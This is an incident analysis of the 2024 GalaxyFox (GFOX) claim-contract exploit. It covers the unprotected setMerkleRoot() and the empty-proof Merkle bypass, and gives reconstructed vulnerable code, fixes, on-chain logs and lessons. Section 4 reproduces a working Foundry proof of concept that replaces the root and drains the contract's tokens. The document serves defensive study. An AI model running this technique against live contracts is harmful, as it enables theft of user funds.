# GalaxyFox Token (GFOX) — Missing Access Control Leading to Merkle Root Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05-10 |
| **Protocol** | GalaxyFox Token (GFOX) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~108.74 ETH (approx. $330,000) + copycat attacker drained an additional 2.32 ETH |
| **Attacker (Primary)** | [0xFcE1...E454](https://etherscan.io/address/0xFcE19F8f823759b5867ef9a5055A376f20c5E454) |
| **Attacker (Copycat)** | [0x14b3...8467](https://etherscan.io/address/0x14b362d2e38250604f21a334d71c13e2ed478467) |
| **Attack Contract** | [0x86C6...AA5](https://etherscan.io/address/0x86C68d9e13d8d6a70b6423CEB2aEdB19b59F2AA5) |
| **Attack Tx** | [0x12fe...e6f7](https://etherscan.io/tx/0x12fe79f1de8aed0ba947cec4dce5d33368d649903cb45a5d3e915cc459e751fc) |
| **Vulnerable Contract (GfoxClaim)** | [0x11a4...86b6](https://etherscan.io/address/0x11a4a5733237082a6c08772927ce0a2b5f8a86b6) |
| **Vulnerable Contract (AttackProxy)** | [0x47c4...1686](https://etherscan.io/address/0x47c4b3144de2c87a458d510c0c0911d1903d1686) |
| **GFOX Token** | [0x8f1c...2662](https://etherscan.io/token/0x8f1cece048cade6b8a05dfa2f90ee4025f4f2662) |
| **Attack Block** | [19835925](https://etherscan.io/block/19835925) |
| **Root Cause** | Missing access control modifier on `setMerkleRoot()` — anyone could replace the Merkle root |
| **PoC Source** | [DeFiHackLabs — GFOX_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/GFOX_exp.sol) |

---

## 1. Vulnerability Overview

The claim contract (`GfoxClaim`) of GalaxyFox Token (GFOX) implemented a Merkle proof-based token airdrop and distribution system. In a properly designed Merkle claim system, only an administrator should be able to change the Merkle root, and users must submit a valid proof against a predetermined root in order to receive tokens.

However, because `setMerkleRoot()` lacked an `onlyOwner` or equivalent access control modifier, an external attacker could set an arbitrary Merkle root and then compute a proof matching that root to invoke the `claim()` function. The attacker used an empty proof array (`new bytes32[](0)`) and a Merkle root derived from a single leaf (`keccak256(abi.encodePacked(to, amount))`) to drain approximately 1,335,339,824 GFOX (valued at ~108.74 ETH, $330,000 at the time). After the primary attack, a copycat attacker exploited the same vulnerability to steal an additional ~2.32 ETH, and the incident caused the GFOX token price to crash 77%.

**Vulnerability combination**:
- **V-01** (Primary): Missing access control on `setMerkleRoot()` (CWE-284)
- **V-02** (Secondary): Single-leaf Merkle tree allowed — verification passes with an empty proof array (CWE-345)

---

## 2. Vulnerable Code Analysis

### 2.1 setMerkleRoot() — Missing Access Control (Core Vulnerability)

#### ❌ Vulnerable Code (Reconstructed)

```solidity
// GfoxClaim contract (0x11a4a5733237082a6c08772927ce0a2b5f8a86b6)
// Source unverified — reconstructed via PoC and function signature reverse engineering

contract GfoxClaim {
    bytes32 public merkleRoot;   // Currently valid Merkle root
    IERC20 public gfoxToken;     // GFOX token address
    mapping(address => bool) public claimed;  // Whether claim has been completed

    // ❌ Vulnerability: no onlyOwner modifier!
    // Anyone can call this function to replace the Merkle root arbitrarily.
    function setMerkleRoot(bytes32 _merkleRoot) external {
        merkleRoot = _merkleRoot;  // ❌ Root replacement allowed without access control
    }

    // ❌ Vulnerability: verification can pass with a single leaf (empty proof array)
    // If leaf == merkleRoot, verification succeeds even with an empty proof
    function claim(
        address to,
        uint256 amount,
        bytes32[] calldata proof
    ) external {
        require(!claimed[to], "GfoxClaim: Already claimed");

        // Merkle proof verification — if proof array is empty, leaf must equal root to pass
        bytes32 leaf = keccak256(abi.encodePacked(to, amount));
        require(
            MerkleProof.verify(proof, merkleRoot, leaf),
            "GfoxClaim: Invalid proof"
        );

        claimed[to] = true;
        // Transfer GFOX tokens to the claiming address
        gfoxToken.transfer(to, amount);
    }
}
```

#### ✅ Fixed Code

```solidity
contract GfoxClaim is Ownable {
    bytes32 public merkleRoot;
    IERC20 public gfoxToken;
    mapping(address => bool) public claimed;

    // ✅ Fix: added onlyOwner modifier — only the contract owner can change the Merkle root
    function setMerkleRoot(bytes32 _merkleRoot) external onlyOwner {
        require(_merkleRoot != bytes32(0), "GfoxClaim: invalid root");  // ✅ Prevent empty root
        bytes32 oldRoot = merkleRoot;
        merkleRoot = _merkleRoot;
        emit MerkleRootUpdated(oldRoot, _merkleRoot);  // ✅ Event logging
    }

    function claim(
        address to,
        uint256 amount,
        bytes32[] calldata proof
    ) external {
        require(!claimed[to], "GfoxClaim: Already claimed");
        require(proof.length > 0, "GfoxClaim: Empty proof not allowed");  // ✅ Block empty proof

        bytes32 leaf = keccak256(abi.encodePacked(to, amount));
        require(
            MerkleProof.verify(proof, merkleRoot, leaf),
            "GfoxClaim: Invalid proof"
        );

        claimed[to] = true;
        gfoxToken.transfer(to, amount);
    }
}
```

**Issue**: `setMerkleRoot()` had no permission validation whatsoever, allowing an attacker to set a hash computed from their own address and desired amount as the Merkle root. OpenZeppelin's `MerkleProof.verify()` returns `true` when the proof array is empty and `leaf == root`, so the attacker forged a complete Merkle proof with just a single hash computation.

---

### 2.2 Merkle Proof Single-Leaf Bypass

#### ❌ Vulnerable Behavior

```solidity
// OpenZeppelin MerkleProof.verify() internal behavior
// When proof array is empty: computedHash == leaf (initial value)
// Return condition: computedHash == root
// Therefore if leaf == root, verify() == true even with an empty proof

// Attacker's root computation logic (excerpted from PoC)
function _merkleRoot(address to, uint256 amount) internal pure returns (bytes32) {
    // ❌ A single leaf becomes the root itself — no proof path needed
    return keccak256(abi.encodePacked(to, amount));
}
```

#### ✅ Fixed Behavior

```solidity
// ✅ Enforce minimum proof length
require(proof.length >= MIN_PROOF_DEPTH, "Proof too short");

// ✅ Or construct merkleRoot with a sufficiently large tree
// (policy to enforce minimum tree depth so a single leaf cannot become the root)
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- No prior preparation required (no funding, no flash loan)
- The attacker could carry out the attack using only the publicly available contract interface and the vulnerability
- After deploying the attack contract (`0x86C6...AA5`), the attack was completed in a single transaction

### 3.2 Execution Phase

```
Step 1: Determine the amount to claim
         amount = 1,335,339,824.3887 GFOX (full balance held by the contract)

Step 2: Compute the malicious Merkle root
         root = keccak256(abi.encodePacked(attackerAddress, amount))
         → Single-leaf root generated from only the attacker's address and amount

Step 3: Call setMerkleRoot(root)
         → Succeeds immediately due to lack of access control
         → merkleRoot of the GfoxClaim contract is replaced

Step 4: Call claim(attackerAddress, amount, [])
         → proof = empty array (new bytes32[](0))
         → leaf == root, so MerkleProof.verify() == true
         → claimed[attacker] = true, GFOX transferred

Step 5: UniswapV2 swap (GFOX → WETH)
         → GFOX approve(UniswapV2Router, MAX)
         → swapExactTokensForTokensSupportingFeeOnTransferTokens()
         → Received 108.744 WETH

Step 6: Transfer WETH to attacker EOA
         → Final profit: 108.744 WETH (~$330,000)
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│  Attacker EOA                                                    │
│  0xFcE19F8f823759b5867ef9a5055A376f20c5E454                     │
└──────────────────────────┬──────────────────────────────────────┘
                           │ Transaction submitted (block #19835925)
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│  Attack Contract (deployed)                                      │
│  0x86C68d9e13d8d6a70b6423CEB2aEdB19b59F2AA5                     │
│                                                                  │
│  [Step 1] amount = query GFOX balance                            │
│  [Step 2] root = keccak256(abi.encodePacked(self, amount))       │
└──────────────────────────┬──────────────────────────────────────┘
                           │
          ┌────────────────┴────────────────┐
          │ [Step 3]                        │ [Step 4]
          │ setMerkleRoot(root)             │ claim(self, amount, [])
          ▼                                 ▼
┌──────────────────────────────────────────────────────────────────┐
│  GfoxClaim Contract (vulnerable)                                  │
│  0x11a4a5733237082a6c08772927ce0a2b5f8a86b6                      │
│                                                                   │
│  ❌ setMerkleRoot(): no onlyOwner → root replacement succeeds     │
│  ❌ claim(): verify([], root, leaf) — leaf==root → passes         │
│                                                                   │
│  → Transfer 1,335,339,824 GFOX tokens                            │
└────────────────────────────────┬─────────────────────────────────┘
                                 │ GFOX transfer
                                 ▼
┌──────────────────────────────────────────────────────────────────┐
│  Attack Contract                                                  │
│                                                                   │
│  [Step 5] GFOX approve(UniswapV2Router, MAX)                      │
│  [Step 5] swapExactTokensForTokensSupportingFeeOnTransferTokens() │
└────────────────────────────────┬─────────────────────────────────┘
                                 │ GFOX → WETH swap
                                 ▼
┌──────────────────────────────────────────────────────────────────┐
│  UniswapV2 GFOX/WETH Pool                                        │
│  0x92ee0df7f6b0674cabc9bfc64873786fa7be82d0                      │
│                                                                   │
│  Mass GFOX sell → 108.744 WETH withdrawn                         │
└────────────────────────────────┬─────────────────────────────────┘
                                 │ 108.744 WETH transferred
                                 ▼
┌──────────────────────────────────────────────────────────────────┐
│  Attacker EOA (final recipient)                                   │
│  0xFcE19F8f823759b5867ef9a5055A376f20c5E454                      │
│  Profit: 108.744 WETH ≈ $330,000                                 │
└──────────────────────────────────────────────────────────────────┘

※ Subsequently, the copycat attacker (0x14b3...8467) exploited the same
   vulnerability to steal an additional 2.32 ETH (~$7,029)
```

### 3.4 Outcome

- Primary attacker profit: **108.744 WETH (~$330,000)**
- Copycat attacker profit: **2.32 ETH (~$7,029)**
- Protocol loss: **~$337,000**
- GFOX token price crashed **77%**
- All GFOX in the claim contract drained

---

## 4. PoC Code (DeFiHackLabs)

Source: [GFOX_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/GFOX_exp.sol)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// @KeyInfo - Total Lost : 330K
// Attacker : https://etherscan.io/address/0xFcE19F8f823759b5867ef9a5055A376f20c5E454
// Attack Contract : https://etherscan.io/address/0x86C68d9e13d8d6a70b6423CEB2aEdB19b59F2AA5
// Vulnerable Contract : https://etherscan.io/address/0x47c4b3144de2c87a458d510c0c0911d1903d1686
// Attack Tx : https://etherscan.io/tx/0x12fe79f1de8aed0ba947cec4dce5d33368d649903cb45a5d3e915cc459e751fc

// Vulnerable contract interface definition
interface IVictim {
    // ❌ Core vulnerable function: exposed externally without access control
    function setMerkleRoot(bytes32 _merkleRoot) external;

    // ❌ Claim function callable with an empty proof array
    function claim(address to, uint256 amount, bytes32[] calldata proof) external;
}

contract GFOXExploit is Test {
    // Fork mainnet at the block immediately before the attack (block 19,835,924)
    uint256 blocknumToForkFrom = 19_835_924;

    IERC20 private gfox;    // GFOX token contract
    IVictim private victim; // GfoxClaim contract (vulnerable)

    function setUp() public {
        // Fork Ethereum mainnet at the block just before the attack
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        // Set GFOX token address
        gfox = IERC20(0x8F1CecE048Cade6b8a05dFA2f90EE4025F4F2662);
        // Set vulnerable claim contract address
        victim = IVictim(0x11A4a5733237082a6C08772927CE0a2B5f8A86B6);
    }

    function testExploit() external balanceLog {
        // [Step 1] Set the amount of GFOX to drain (full balance of the claim contract)
        uint256 amount = 1_780_453_099_185_000_000_000_000_000;

        // [Step 2] Compute the malicious Merkle root
        // Create a single leaf from the attacker's address (address(this)) and claim amount
        // → This hash is the root itself, so no separate proof path is needed
        bytes32 root = _merkleRoot(address(this), amount);

        // [Step 3] Call setMerkleRoot() with no access control
        // → The legitimate Merkle root is replaced with the attacker-computed value
        victim.setMerkleRoot(root);

        // [Step 4] Call claim() with an empty proof array
        // → leaf (= keccak256(this, amount)) == root, so verification passes
        // → All GFOX tokens transferred to the attacker's contract
        victim.claim(address(this), amount, new bytes32[](0));
        // Afterwards, swap GFOX → WETH on Uniswap to realize profit
    }

    // Helper to compute a single-leaf Merkle root
    // keccak256(address, amount) = root of a single-node tree
    function _merkleRoot(address to, uint256 amount) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(to, amount));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Missing access control on `setMerkleRoot()` | CRITICAL | CWE-284 (Improper Access Control) | `03_access_control.md` Pattern 1 | Poly Network (2021) |
| V-02 | Single-leaf Merkle tree — empty proof array allowed | HIGH | CWE-345 (Insufficient Data Verification) | `15_merkle_airdrop.md` | Penpie (2024) |
| V-03 | No withdrawal limit on claim contract funds | HIGH | CWE-400 (Resource Exhaustion) | `03_access_control.md` | MetaPoint (2023) |

### V-01: Missing Access Control on setMerkleRoot()

- **Description**: The `setMerkleRoot()` function is declared with `external` visibility but has no `onlyOwner`, `onlyAdmin`, or equivalent access control modifier, allowing any arbitrary external address to replace the Merkle root.
- **Impact**: Once an attacker sets a Merkle root favorable to themselves, the entire claim system is neutralized and all funds can be drained.
- **Attack Condition**: Only read access to the vulnerable contract is required (automatically satisfied on a public blockchain), enabling an immediate attack.

### V-02: Single-Leaf Merkle Tree — Empty Proof Array Allowed

- **Description**: OpenZeppelin's `MerkleProof.verify(proof, root, leaf)` returns `true` when the `proof` array is empty and `leaf == root`. If an attacker uses V-01 to set a root such that `leaf == root`, the empty proof alone is sufficient to pass verification.
- **Impact**: Combined with V-01, a complete drain is possible with just two function calls (`setMerkleRoot` + `claim`).
- **Attack Condition**: Exploitable only in environments where V-01 exists; low risk in isolation.

### V-03: No Withdrawal Limit on Claim Contract Funds

- **Description**: There is no cap on the amount that can be withdrawn per claim, allowing the contract's entire balance to be drained in a single transaction.
- **Impact**: Maximizes damage (entire contract balance drained).
- **Attack Condition**: Exploited in conjunction with V-01.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// 1. Add onlyOwner to setMerkleRoot (minimum requirement)
import "@openzeppelin/contracts/access/Ownable.sol";

contract GfoxClaim is Ownable {

    // ✅ Only the administrator can change the Merkle root
    function setMerkleRoot(bytes32 _merkleRoot) external onlyOwner {
        require(_merkleRoot != bytes32(0), "GfoxClaim: zero root");
        merkleRoot = _merkleRoot;
        emit MerkleRootUpdated(merkleRoot, _merkleRoot);
    }

    // ✅ Block empty proof arrays + enforce minimum claim unit
    function claim(
        address to,
        uint256 amount,
        bytes32[] calldata proof
    ) external {
        require(!claimed[to], "GfoxClaim: Already claimed");
        require(proof.length > 0, "GfoxClaim: proof required");  // ✅ Block empty proof

        bytes32 leaf = keccak256(abi.encodePacked(to, amount));
        require(
            MerkleProof.verify(proof, merkleRoot, leaf),
            "GfoxClaim: Invalid proof"
        );

        claimed[to] = true;
        gfoxToken.safeTransfer(to, amount);
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Missing access control | Apply OpenZeppelin `AccessControl` or `Ownable2Step` — two-step ownership transfer to prevent key loss |
| V-02: Single-leaf bypass | Enforce `proof.length >= minProofDepth` — establish a minimum Merkle tree depth policy |
| V-03: No withdrawal limit | Set a maximum amount per claim; introduce daily withdrawal rate limiting |
| General: No audit | Mandatory professional security audit before deployment — especially for fund-holding contracts |
| General: No emergency stop | Add `pause()` / `unpause()` emergency stop functionality (OpenZeppelin `Pausable`) |
| General: No monitoring | Configure real-time anomalous transaction alerts via Forta, OpenZeppelin Defender, etc. |

---

## 7. Lessons Learned

1. **Admin functions must always have access control**: Every function that modifies protocol state with `external` or `public` visibility requires appropriate permission checks such as `onlyOwner` or `onlyRole`. Configuration-changing functions in fund-holding contracts must be reviewed with the highest priority.

2. **Be aware of the single-leaf vulnerability in Merkle proof systems**: OpenZeppelin's `MerkleProof.verify()` returns `true` for an empty proof when `leaf == root`. If the root can be set externally, this behavior can become an immediate fund-drain vector. Minimum proof length must be enforced.

3. **Fund-holding contracts require thorough auditing**: Contracts that hold large amounts of tokens — such as airdrop and claim contracts — must undergo a professional security audit before deployment. This incident demonstrates that the omission of a single modifier line led to a $330,000 loss.

4. **Published vulnerabilities get replicated**: A copycat attacker appeared immediately after the primary attack, exploiting the same vulnerability. Once a vulnerability is confirmed, an immediate contract pause or patch is required. An emergency stop (`pause`) is not optional — it is mandatory.

5. **Apply the principle of least privilege**: In a claim system, the only permission a user needs is to claim their own allocation. Setting the Merkle root is an administrator privilege and must never be exposed to ordinary users.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual Value | Match |
|------|--------|-------------|-----------|
| GFOX amount claimed | 1,780,453,099 GFOX (PoC estimate) | 1,335,339,824 GFOX (based on actual balance) | Approximate (actual balance differed) |
| Final WETH profit | ~108 ETH | **108.744010 WETH** | Match |
| Attack block | 19,835,924 (fork basis) | **19,835,925** (execution block) | Normal (1 block after fork) |
| Attacker EOA | 0xFcE1...E454 | **0xFcE19F8f823759b5867ef9a5055A376f20c5E454** | Match |
| Attack contract (`to`) | — | **0x86C68d9e13d8d6a70b6423CEB2aEdB19b59F2AA5** | Confirmed |

> **Note**: The `amount` value in the PoC code (`1,780,453,099,185,000...`) is based on the contract balance at test time; because the actual contract balance differed at the time of the real attack, the actual claimed amount was **1,335,339,824.3887 GFOX**.

### 8.2 On-Chain Event Log Sequence (TX: 0x12fe...51fc)

| Order | Event | Contract | Details |
|------|--------|----------|------|
| 1 | `Claimed` | GfoxClaim (0x11a4...86b6) | Claim event emitted; attack contract is the recipient |
| 2 | `Transfer` | GFOX (0x8f1c...2662) | GfoxClaim → attack contract, 1,335,339,824 GFOX |
| 3 | `Approval` | GFOX (0x8f1c...2662) | Attack contract → UniswapV2Router, unlimited approval |
| 4 | `Transfer` | GFOX (0x8f1c...2662) | Attack contract → LP pool, 26,706,796 GFOX (fee/tax) |
| 5 | `Transfer` | GFOX (0x8f1c...2662) | Attack contract → GFOX contract (buyback tax) |
| 6 | `Transfer` | GFOX (0x8f1c...2662) | Attack contract → swap fee recipient |
| 7 | `Sync` | UniV2 GFOX/WETH Pool (0x92ee...2d0) | Pool reserve update |
| 8 | `Swap` | UniV2 GFOX/WETH Pool (0x92ee...2d0) | GFOX sold → WETH received |
| 9 | `Transfer` | WETH (0xC02A...CC2) | Pool → attack contract, 108.744 WETH |
| 10 | `Transfer` | WETH (0xC02A...CC2) | Attack contract → attacker EOA, 108.744 WETH |

### 8.3 On-Chain Verification Summary

- **Attack vector confirmed**: Called in sequence — `setMerkleRoot()` (selector: `0x7cb64759`) → `claim()` (selector: `0x3d13f874`)
- **Single transaction**: All steps (Merkle root replacement → claim → swap → profit transfer) executed atomically within one transaction from the attack contract
- **Gas efficiency**: 1,272,734 gas used (76% of limit) — fully automated attack including swap
- **Profit verified**: 108.744010 WETH = `0x000000000000000000000005e5205493675adb6b` (confirmed in hex)

---

*References: [Neptune Mutual Analysis](https://medium.com/neptune-mutual/how-was-galaxy-fox-token-exploited-c0860520cdc2) | [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/GFOX_exp.sol) | [CertiK Alert](https://twitter.com/CertiKAlert/status/1788751142144401886)*